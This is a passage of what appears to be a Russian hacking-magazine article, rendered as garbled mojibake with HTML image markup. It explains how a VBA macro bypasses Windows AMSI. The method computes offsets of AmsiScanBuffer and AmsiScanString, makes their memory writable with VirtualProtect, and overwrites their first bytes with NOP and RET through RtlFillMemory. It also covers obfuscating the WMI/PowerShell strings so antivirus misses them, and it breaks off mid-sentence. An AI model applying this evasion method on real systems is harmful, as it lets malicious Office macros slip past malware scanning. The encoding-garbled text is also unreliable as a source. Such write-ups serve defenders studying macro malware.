–ï—Å–ª–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ WinDbg —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π –≤ –ø–∞–º—è—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ AMSI.dll –Ω–∞—á–∏–Ω–∞—è —Å —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω–æ–π –ø–æ –∞–¥—Ä–µ—Å—É 0x100 –≤ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ (256 –±–∞–π—Ç–æ–≤ –≤ –¥–µ—Å—è—Ç–∏—á–Ω–æ–π), —Ç–æ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å, –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç –≤–µ—Ä—Ö–Ω—è—è —á–∞—Å—Ç—å –≤—ã–≤–æ–¥–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="06.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26880%2F06.png&amp;hash=c2ebf9b2df56ea028f3216876ddd7e84" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../06ae1a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26880%2F06.png&amp;hash=c2ebf9b2df56ea028f3216876ddd7e84"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26880/06.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="06.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–°—Ç—Ä–µ–ª–∫–∞ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –ø–µ—Ä–≤—ã–µ –æ–ø–∫–æ–¥—ã –≤ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer, –∞ —Å–ª–µ–≤–∞ –ø–æ–∫–∞–∑–∞–Ω –∞—Å—Å–æ—Ü–∏–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Å —ç—Ç–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –∞–¥—Ä–µ—Å –≤ –ø–∞–º—è—Ç–∏: 0x00007ffa054f35e0. –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, —Ñ—É–Ω–∫—Ü–∏—è AmsiScanBuffer –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è –∏–º–µ–Ω–Ω–æ –≤ —ç—Ç–æ–π —Ç–æ—á–∫–µ. –ò–∑—É—á–∏–≤ –≤—ã–≤–æ–¥ –¥–∞–ª–µ–µ, –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ —Å–ª–µ–¥—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é ‚Äî AmsiScanString, –∏ –≤—ã—è—Å–Ω–∏—Ç—å –µ–µ –∞–¥—Ä–µ—Å: 0x00007ffa054f36e0.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="07.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26881%2F07.png&amp;hash=bfaffd9357dfa76853068544ade00c78" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../073e60.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26881%2F07.png&amp;hash=bfaffd9357dfa76853068544ade00c78"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26881/07.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="07.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ  –ë—Ä–µ–Ω–¥–∞–Ω –æ—Ç—ã—Å–∫–∞–ª –≤ –≤—ã–≤–æ–¥–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π func_addr, –∫–æ—Ç–æ—Ä—É—é –∑–∞–≥—Ä—É–∑–∏–ª –≤ —Å–≤–æ–π –º–∞–∫—Ä–æ—Å VBA –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Ñ—É–Ω–∫—Ü–∏–∏ GetPrAddr. –í —ç—Ç–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ AmsiUacInitialize: 0x00007ffa054f3740.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="08.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26882%2F08.png&amp;hash=99f65c48e29841f6cfd3f827c42da6a4" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../089e22.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26882%2F08.png&amp;hash=99f65c48e29841f6cfd3f827c42da6a4"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26882/08.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="08.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–í—Å–µ, —á—Ç–æ –æ—Å—Ç–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å –∞–≤—Ç–æ—Ä—É —Å–∫—Ä–∏–ø—Ç–∞, ‚Äî —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ –≤—ã—á–µ—Å—Ç—å –∏–∑ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiUacInitialize –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–π AmsiScanString –∏ AmsiScanBuffer. –¢–∞–∫ –±—É–¥—É—Ç –ø–æ–ª—É—á–µ–Ω—ã –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö.<br />
<br />
0x054f3740 (AmsiUacInitialize Start Address) - 0x054f36e0 (AmsiScanString Start Address) = 0x60 = 96 bytes<br />
0x054f3740 (AmsiUacInitialize Start Address) - 0x54f35e0 (AmsiScanBuffer Start Address) = 0x160 = 352 bytes<br />
<br />
–°–ª–µ–¥—É—é—â–∞—è —á–∞—Å—Ç—å —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ë—Ä–µ–Ω–¥–∞–Ω–æ–º –û—Ä—Ç–∏–∑–æ–º –º–∞–∫—Ä–æ—Å–∞ –º–µ–Ω—è–µ—Ç –∑–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –ø–∞–º—è—Ç–∏ –∏ –ø–æ—Ä—è–¥–æ–∫ –¥–æ—Å—Ç—É–ø–∞ –∫ –Ω–µ–π —Ü–µ–ª–µ–≤—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—Ä–∏ –ø–æ–º–æ—â–∏ API-—Ñ—É–Ω–∫—Ü–∏–∏ VirtualProtect, –∫–æ—Ç–æ—Ä—É—é –∞–≤—Ç–æ—Ä –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–ª –≤ VirtPro.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="09.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26883%2F09.png&amp;hash=bfe681621c119ab19844412ba5e2a35d" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../09693a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26883%2F09.png&amp;hash=bfe681621c119ab19844412ba5e2a35d"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26883/09.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="09.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–§—É–Ω–∫—Ü–∏—è VirtualProtect –º–µ–Ω—è–µ—Ç —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∑–∞—â–∏—Ç—ã –≤ –æ–±–ª–∞—Å—Ç–∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä–∞—è –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –∞–¥—Ä–µ—Å–Ω–æ–º—É –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤—É –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –° –µ–µ –ø–æ–º–æ—â—å—é –º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏ –∑–∞—â–∏—Ç—ã –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —É—á–∞—Å—Ç–∫–∞ –ø–∞–º—è—Ç–∏ (—Å –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ ¬´—Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è¬ª –∏–ª–∏ ¬´–¥–ª—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è¬ª), –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —á–µ–≥–æ –ø–æ—è–≤–ª—è–µ—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–µ —Ç–∞–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏.<br />
<br />
VirtualProtect –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã: –∞–¥—Ä–µ—Å —Ç–æ–≥–æ –º–µ—Å—Ç–∞, –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å (—ç—Ç–æ –∞–¥—Ä–µ—Å –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–µ–π –Ω–∞—Å —Ñ—É–Ω–∫—Ü–∏–∏), —Ä–∞–∑–º–µ—Ä –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä—É—é —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å (32 –±–∞–π—Ç–∞ –æ—Ç –Ω–∞—á–∞–ª–∞ –∞–¥—Ä–µ—Å–∞), —É—Ä–æ–≤–Ω–∏ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –æ–±–µ—Å–ø–µ—á–∏—Ç—å (–ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –≤–∏–¥–µ –∑–Ω–∞—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –±—É–¥–µ—Ç –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å—Å—è –ø—Ä–∏ –ø–æ–º–æ—â–∏ –ø–æ–±–∏—Ç–æ–≤–æ–π –æ–ø–µ—Ä–∞—Ü–∏–∏ AND). –ù–∞–∫–æ–Ω–µ—Ü, –≤ —Å—Ü–µ–Ω–∞—Ä–∏–∏ —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è flOldProtection. –§—É–Ω–∫—Ü–∏—è —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤ —ç—Ç—É –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é —Å—Ç–∞—Ä–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏ ‚Äì –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è.<br />
<br />
–ü–æ–ª—É—á–∏–≤ –¥–æ—Å—Ç—É–ø –∫ —á—Ç–µ–Ω–∏—é –∏ –∑–∞–ø–∏—Å–∏ —Ç–µ—Ö –æ–±–ª–∞—Å—Ç–µ–π –ø–∞–º—è—Ç–∏, —á—Ç–æ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –∑–∞–ø–∏—Å–∏, –ë—Ä–µ–Ω–¥–∞–Ω –ø–µ—Ä–µ—à–µ–ª –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –∫ –ø—Ä–æ–ø–∞—Ç—á–∏–≤–∞–Ω–∏—é AMSI. –î–ª—è —ç—Ç–æ–≥–æ –æ–Ω –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª WinAPI-—Ñ—É–Ω–∫—Ü–∏—é RtlFillMemory. –¢–∞–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–∞–∫ RtlMoveMemory, —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤—Ä–µ–¥–æ–Ω–æ—Å–∞–º–∏, –ø–æ—ç—Ç–æ–º—É –ª–µ–≥–∫–æ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—é—Ç—Å—è —ç–≤—Ä–∏—Å—Ç–∏–∫–æ–π –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤. –ê –≤–æ—Ç RtlFillMemory ‚Äì –Ω–µ —Å–∞–º—ã–π —á–∞—Å—Ç–æ—Ç–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç, –∏–∑‚Äë–∑–∞ —á–µ–≥–æ –µ–µ –º–æ–≥—É—Ç –∏ –Ω–µ —Å—ç–º—É–ª–∏—Ä–æ–≤–∞—Ç—å –¥–≤–∏–∂–∫–∏, —Ä–∞–±–æ—Ç–∞ –∫–æ—Ç–æ—Ä—ã—Ö –æ—Å–Ω–æ–≤–∞–Ω–∞ –Ω–∞ —ç–≤—Ä–∏—Å—Ç–∏–∫–µ. –î–∞ –∏ –ø—Ä–∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–º –∞–Ω–∞–ª–∏–∑–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –¥–∞–ª–µ–∫–æ –Ω–µ –≤—Å–µ–≥–¥–∞ –æ–±—Ä–∞—â–∞—é—Ç –Ω–∞ –Ω–µ–µ –≤–Ω–∏–º–∞–Ω–∏–µ. –ë—Ä–µ–Ω–¥–∞–Ω –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–ª —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é –≤ patcher.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="10.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26884%2F10.png&amp;hash=f30cb251bf641bbff828ecb45cc7340d" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../10a709.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26884%2F10.png&amp;hash=f30cb251bf641bbff828ecb45cc7340d"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26884/10.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="10.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–í —Å–∫—Ä–∏–ø—Ç–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ RtlFillMemory –ø–æ –ø—Å–µ–≤–¥–æ–Ω–∏–º—É patcher, –µ–π –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–π AmsiScanString –∏ AmsiScanBuffer. –ó–∞—Ç–µ–º –Ω—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å, —Å–∫–æ–ª—å–∫–æ –±–∞–π—Ç–æ–≤ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∑–∞–ø–æ–ª–Ω–∏—Ç—å, –∏, –Ω–∞–∫–æ–Ω–µ—Ü, –ø–µ—Ä–µ–¥–∞—Ç—å —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∫–æ–¥–∞ –æ–ø–µ—Ä–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä–æ–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ç—É–¥–∞ –¥–æ–±–∞–≤–∏—Ç—å: 0x90  ‚Äî —ç—Ç–æ –∫–æ–¥ NOP, –æ–Ω –Ω–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞–µ—Ç. –ó–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Ç–æ –∂–µ –¥–µ–π—Å—Ç–≤–∏–µ, –Ω–æ —Å —É–≤–µ–ª–∏—á–µ–Ω–∏–µ–º –∞–¥—Ä–µ—Å–∞ –Ω–∞ 1, –ø—Ä–∏ —ç—Ç–æ–º —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –∫–æ–¥ –æ–ø–µ—Ä–∞—Ü–∏–∏ return, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–≤–µ–Ω 0xc3.<br />
<br />
–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –≤ –Ω–∞—á–∞–ª–µ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanString –±—É–¥–µ—Ç –ø–æ—Å—Ç–∞–≤–ª–µ–Ω –Ω–µ–æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π –∫–æ–¥ 0x90, –∞ –ø–æ—Å–ª–µ –Ω–µ–≥–æ ‚Äì –∫–æ–¥ –≤–æ–∑–≤—Ä–∞—Ç–∞ 0xC3, –∏ —ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ—Å—Ç–æ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –±—É–¥–µ—Ç –≤—ã–∑–≤–∞–Ω–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª–∏—Ç –æ–±–æ–π—Ç–∏ AMSI –≤ VBA. –í–æ—Ç –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanString –ø–æ—Å–ª–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –ø–∞—Ç—á–∞ –≤ –æ—Ç–ª–∞–¥—á–∏–∫–µ WinDbg.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="11.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26885%2F11.png&amp;hash=ffb75554b5fd98c4aaf39288188eaf1a" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../114f24.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26885%2F11.png&amp;hash=ffb75554b5fd98c4aaf39288188eaf1a"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26885/11.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="11.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–í—Å–µ, —á—Ç–æ –æ—Å—Ç–∞–µ—Ç—Å—è ‚Äì –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å—Å –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer, —Å–º–µ—â–µ–Ω–∏–µ –¥–ª—è –∫–æ—Ç–æ—Ä–æ–π —É–∂–µ –∏–∑–≤–µ—Å—Ç–Ω–æ. –¢—É—Ç —Å—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –µ—Å—Ç—å –∏ –±–æ–ª–µ–µ –∏–∑–æ—â—Ä–µ–Ω–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ, –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∏—Å–∫–∞—Ç—å –Ω–∞—á–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã –∫–∞–∂–¥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –∫–∞–∫ —Ç–æ–ª—å–∫–æ –∞–¥—Ä–µ—Å Amsi.dll –±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω –≤ –ø–∞–º—è—Ç—å.  –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –µ—Å—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–ª–∏—á–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –ø–∞—Ç—á–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ 32-—Ä–∞–∑—Ä—è–¥–Ω–æ–π –∏ 64-—Ä–∞–∑—Ä—è–¥–Ω–æ–π –≤–µ—Ä—Å–∏—è—Ö Word.<br />
<br />
–ù–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–∞–π—Ç–∞—Ö –º–æ–∂–Ω–æ –≤—Å—Ç—Ä–µ—Ç–∏—Ç—å –æ–ø–∏—Å–∞–Ω–∏—è —Å–ø–æ—Å–æ–±–æ–≤ –æ–±—Ö–æ–¥–∞ AMSI –Ω–∞ VBA —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ –∏–Ω—ã—Ö, –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤, –Ω–µ —Ç—Ä–µ–±—É—é—â–∏—Ö –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å API Windows. –ü—Ä–∞–≤–¥–∞, –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –Ω–∏—Ö —Ç—Ä–µ–±—É—é—Ç –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –Ω–∞ –¥–∏—Å–∫ —Ñ–∞–π–ª—ã –∏ —Å —ç—Ç–∏–º –º–æ–∂–Ω–æ –≤–ª–∏–ø–Ω—É—Ç—å. –ü—Ä–∏–º–µ—Ä—ã –Ω–∞ —ç—Ç—É —Ç–µ–º—É –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ —Å–ª–µ–¥—É—é—â–µ–º <a href="https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba" target="_blank" class="link link--external" rel="noopener">Git-—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏</a>.<br />
<br />
<b>–û–±—Ñ—É—Å–∫–∞—Ü–∏—è —Å—Ç—Ä–æ–∫</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ë—Ä–µ–Ω–¥–∞–Ω–æ–º –û—Ä—Ç–∏–∑–æ–º VBA-—Å–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç WMI-–æ–±—ä–µ–∫—Ç –¥–ª—è –ø–æ—Ä–æ–∂–¥–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ PowerShell, –æ–Ω –Ω–µ–∏–∑–±–µ–∂–Ω–æ –ø—Ä–∏–≤–ª–µ—á–µ—Ç –ø–æ–≤—ã—à–µ–Ω–Ω–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ –ª—é–±–æ–≥–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–≥–æ –¥–≤–∏–∂–∫–∞. –ù–∞–∏–±–æ–ª–µ–µ –æ—á–µ–≤–∏–¥–Ω—ã–º —Ä–µ—à–µ–Ω–∏–µ–º —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã —è–≤–ª—è–µ—Ç—Å—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏—Ö —Å—Ç—Ä–æ–∫ –≤–Ω—É—Ç—Ä–∏ –º–∞–∫—Ä–æ—Å–∞.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –æ–±—ä–µ–∫—Ç–∞ WMI –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–∞–∫–∏–µ —Å—Ç—Ä–æ–∫–∏, –∫–∞–∫ winmgmts:, Win32_ProcessStartup, Win32_Process –∏ –∏–º –ø–æ–¥–æ–±–Ω—ã–µ. –ü—Ä–∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–∏ –º–∞–∫—Ä–æ—Å–∞ —ç—Ç–∏ —Å—Ç—Ä–æ–∫–∏ –±—É–¥—É—Ç –∏–¥–µ–∞–ª—å–Ω—ã–º–∏ –º–∏—à–µ–Ω—è–º–∏ –¥–ª—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞, –æ–Ω –ø—Ä–æ—Å—Ç–æ –Ω–µ–∏–∑–±–µ–∂–Ω–æ –ø–æ–º–µ—Ç–∏—Ç –∏—Ö –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ. –ë—Ä–µ–Ω–¥–∞–Ω –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —Å–ª–µ–¥—É—é—â–∏–π –º–µ—Ç–æ–¥ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="12.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26886%2F12.png&amp;hash=662691a838c390ca0fb07bbf75ec80c5" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../1245f2.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26886%2F12.png&amp;hash=662691a838c390ca0fb07bbf75ec80c5"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26886/12.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="12.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–û–Ω –æ–±—ä—è–≤–∏–ª –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥—É—Ç —Å–æ—Ö—Ä–∞–Ω—è—Ç—å—Å—è —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ —Å—Ç—Ä–æ–∫–∏, –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É—é—â–∏–µ –≤ –º–∞–∫—Ä–æ—Å–µ VBA. –ó–∞—Ç–µ–º –æ–Ω –æ–±—ä—è–≤–∏–ª –≤—ã—Ö–æ–¥–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Ç—Ä–æ–∫–∞. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –æ–Ω –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–ª –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏–∑ —Å—Ç—Ä–æ–∫–æ–≤–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –≤ 